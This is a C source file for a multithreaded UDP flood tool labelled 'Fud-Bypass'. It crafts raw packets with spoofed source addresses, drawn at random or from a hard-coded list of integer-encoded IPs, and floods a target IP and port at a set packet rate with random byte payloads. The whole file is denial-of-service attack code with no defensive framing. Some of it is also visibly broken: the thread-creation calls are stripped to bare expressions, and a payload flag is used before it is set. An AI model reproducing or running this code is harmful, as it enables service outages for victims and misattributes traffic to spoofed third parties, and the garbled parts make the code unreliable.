#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
char str[44];
int *salvodropper[4];
int ai=0;

static unsigned int glitch;
static unsigned int scitze;
static unsigned int bypasss;
static unsigned int code;
static unsigned int allasn;
static unsigned int activeplayers;

static unsigned long int Q[4096], c = 362436;
static unsigned int slvport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}


unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
        x++;
        c++;
        }
        return (Q[i] = r - x);
}
   int salvo_random(int min, int max)
{
   return min + rand() % (max+1 - min);
}
unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}
unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph) {
	struct udp_salvo
	{
	unsigned long src_addr;
	unsigned long dst_addr;
	unsigned char zero;
	unsigned char proto;
	unsigned short length;
	} salvohead;
	unsigned short total_len = iph->tot_len;
	salvohead.src_addr=iph->saddr;
	salvohead.dst_addr=iph->daddr;
	salvohead.zero=0;
	salvohead.proto=IPPROTO_UDP;
	salvohead.length=htons(sizeof(struct udphdr));
	int totaltudp_len = sizeof(struct udp_salvo) + sizeof(struct udphdr);
	unsigned short *udp = malloc(totaltudp_len);
	memcpy((unsigned char *)udp,&salvohead,sizeof(struct udp_salvo));
	memcpy((unsigned char *)udp+sizeof(struct udp_salvo),(unsigned char *)udph,sizeof(struct udphdr));
	unsigned short output = csum(udp,totaltudp_len);
	free(udp);
	return output;
}
void setup_ip_header(struct iphdr *iph)
{
	   char ip[17];
        snprintf(ip, sizeof(ip)-1, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htonl(rand()%54321);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = inet_addr(ip);
}

void *flood(void *par1)
{
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = inet_addr(td);
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
        if(s < 0){
			char opt[]="\033[1;32mfailed to create a socket.\033[0m";
        fprintf(stderr, "%s\n", opt);
        exit(-1);
        }
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
		udph->source = htons(rand() % 65535 - 1026);
		udph->dest = slvport;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
			char pompake[]="Salvos : setsockopt() - Sex Error";
        fprintf(stderr, "%s\n", pompake);
        exit(-1);
        }
        init_rand(time(NULL));
        register unsigned int i;
        i = 0;
		int lenght;
		int shortrandom;
		int class[]={16843009,134744072,630511399,630511383,630511360,630511365,630511378,630511384,630511397,630511396,630511372,630511408,630511408,630511401,630511406,630511373,630511383,630511377,630511397,630511375,630511370,630511364,630511401,630511373,630511409,630511405,630511406,630511404,630511400,630511370,630511379,630511368,630511390,630511374,630511379,630511387,630511409,630511391,630511380,630511362,630511375,630511383,630511386,630511403,630511400,630511389,630511387,630511375,630511383,630511402,630511386,534712838,534712845,534712845,534712832,534712848,534712845,534712836,534712847,534712840,534712833,534712834,534712834,534712843,534712845,534712833,534712840,534712841,534712832,534712851,534712833,1598471185,1598471181,1598471172,1598471180,1598471180,1598471182,1598471171,1598471184,1598471188,1598471186,1598471180,1598471185,1598471189,1598471187,1598471170,1598471188,1598471169,1598471177,1598471182,1598471181,1306499596,1306499596,1306499597,1306499587,1306499592,1306499594,1306499604,1306499588,1306499594,1306499586,1306499596,1306499599,1306499597,1306499591,1306499599,1306499587,1306499597,1306499598,1306499585,1306499593,3050740226,3050740239,3050740230,3050740232,3050740228,3050740234,3050740243,3050740236,3050740241,3050740225,3050740225,3050740242,3050740240,3050740230,3050740240,3050740245,3050740234,3050740236,3050740235,3050740240,2689282432,2689282373,2689282567,2689282622,2689282456,2689282338,3565117471,3565117497,3565117467,3565117475,3565117496,3565117474,3565117484,3565117466,3565117481,3565117461,3651781415,3651781402,3651781416,3651781431,3651781432,3651781409,3651781397,3651781421,3651781408,3651781445,1584967727,1584967761,1584967697,1584967698,1584967710,1584967711,1584967776,1584967696,1584967776,1584967759,1585032185,1585060096,1584968932,1585134195,1585138522,1585146880,1585053098,1585049626,1584960929,1584988398,1585103579,1584967976,1585021870,1584981650,1584963254,1585152851,1585072332,1584987688,1584997801,1584970685,1585127356,1585024125,1584958669,1585146969,1585100028,1585076107,1584999357,1584990564,1585120470,1585046737,1584997335,1584984895,1585119070,1585149081,1584964911,1584974149,1585116496,1585094842,1585090793,1585023712,1585038271,1585004751,1585042234,1585131014,1585128599,1585075312,1585130607,1585077360,1585087607,1585059013,1584969860,1585028144,1585067003,1585128434,1585008467,1585163663,1585123181,1585054414,1585129272,1584974438,1584982523,1585067400,1585122086,1585135980,1585165093,1585160821,1585162380,1585079476,1585099041,1585027632,1585014067,1585154747,1584989812,1585163767,1585104492,1585125249,1585009960,1585060379,1585127264,1584997739,1585047959,1584982529,1584959692,1585030178,1585025142,1585143363,1585153869,1585090811,1584985695,1585163983,1585008487,1585004776,1584991316,1584952593,1585125392,1585112125,1584975749,1585035113,1585020491,1585126246,3126348714,3120274988,3122674992,3123372918,3124960498,3122133479,3113893295,3111360991,3116492650,3125967561,3118955116,3119996180,3111098114,3114928785,3114244719,3116165466,3115674296,3123330986,3121350251,3119404046,3121453541,3115871835,3118861893,3112689508,3113843813,3115031146,3118699920,3123211024,3122352258,3121162542,3112488218,3111209015,3125477740,3126086465,3111074888,3119255545,3123255307,3114473012,3125064865,3124632635,3124344432,3126054498,3122505001,3113444911,3120157352,3120981824,3113245392,3122272341,3113599873,3114367561,3114080774,3110580714,3124154744,3122198661,3112605812,3118434438,3121474634,3114264372,3115329912,3118314548,3123023122,3123265333,3114408802,3120567988,3116761615,3120282081,3114933107,3112344978,3114712380,3110916430,3111680576,3121516044,3123171667,3126437148,3122546149,3122719979,3119793470,3121126086,3118060453,3115783973,3113683696,3119560476,3125450581,3110718790,3118067829,3110775736,3112888286,3116157217,3118147310,3115242095,3113916690,3111735542,3113973930,3124272484,3120569759,3122997279,3110899450,3120726833,3114296751,3115105973};
        while(1){
			
        int payload1;

        if(payload1==1){ // Payload 1
   		    char *salvohex[] = {"\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff"};
		    char *randompayload = salvohex[rand()%253];
            char payl[111];

		    sprintf(payl, "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s", randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload, randompayload);

	        shortrandom = salvo_random(13,449);
	        lenght = shortrandom;	
	        memcpy((void *)udph + sizeof(struct udphdr), payl, 111);
	        udph->len=htons(sizeof(struct udphdr) + lenght);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + lenght;
        }

        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
		
		{
		if(salvodropper[0] != NULL && salvodropper[1] != NULL && salvodropper[2] != NULL && salvodropper[3] != NULL)
			iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
		}
		{
		if(salvodropper[0] != NULL && salvodropper[1] != NULL && salvodropper[2] != NULL && salvodropper[3] == NULL)
			iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
		}
		{
		if(salvodropper[0] != NULL && salvodropper[1] != NULL && salvodropper[2] == NULL && salvodropper[3] == NULL)
			iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
		}
		{
		if(salvodropper[0] != NULL && salvodropper[1] == NULL && salvodropper[2] == NULL && salvodropper[3] == NULL)
			iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
		}
		{
		if(salvodropper[0] == NULL && salvodropper[1] == NULL && salvodropper[2] == NULL && salvodropper[3] == NULL)
		iph->saddr = htonl(class[rand_cmwc()%368]);
		}
		
        // iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        udph->source = htons(rand_cmwc() & 0xFFFF);
        udph->check = 0;
        pps++;
        if(i >= limiter)
        {
        i = 0;
		
		payload1=1;

        usleep(sleeptime);
        }
        i++;
        }
}
int main(int argc, char *argv[ ])
{
        if(argc < 5){
        printf("\033[1;31mUsage: ./Fud-Bypass <ip> <port> <threads> <pps> <random & integer> <time>\033[0m\n");
        exit(-1);
        }        
        if(strstr(argv[5], "integer"))
        {
			char intbypass[]="\033[1;36m[+] Send ; private integer list\033[1;m\n";
			fprintf(stderr, "%s", intbypass);
        }
		else
		{
			fprintf(stdout, "\033[1;36m[+] Send ; source class -> %s\033[1;m\n", argv[5]);
		}
		
		char sockets[]="\033[1;35m[+] wait for the socket to open\033[0m\n";
        fprintf(stdout, "%s", sockets);
		slvport = htons(atoi(argv[2]));
        int num_threads = atoi(argv[3]);
        int maxpps = atoi(argv[4]);
        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads];
        int multiplier = 20;
        int i;
		int class;
		
		salvodropper[0] = strtok(argv[5],"integer");
        while(salvodropper[ai] != NULL){
        salvodropper[++ai] = strtok(NULL, "integer");
		}
			
        for(i = 0;i<num_threads;i++){
        ( &thread[i], NULL, &flood, (void *)argv[1]);
		( &thread[i], NULL, &flood, (void *)argv[1]);
		( &thread[i], NULL, &flood, (void *)argv[1]);
		( &thread[i], NULL, &flood, (void *)argv[1]);
        }
		char opens[]="\033[1;33m[+] Flood started\033[0m\n";
        fprintf(stdout, "%s", opens);
        for(i = 0;i<(atoi(argv[6])*multiplier);i++)
        {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
        if(1 > limiter)
        {
        sleeptime+=100;
        } else {
        limiter--;
        }
        } else {
        limiter++;
        if(sleeptime > 25)
        {
        sleeptime-=25;
        } else {
        sleeptime = 0;
        }
        }
        pps = 0;
        }
        return 0;
}
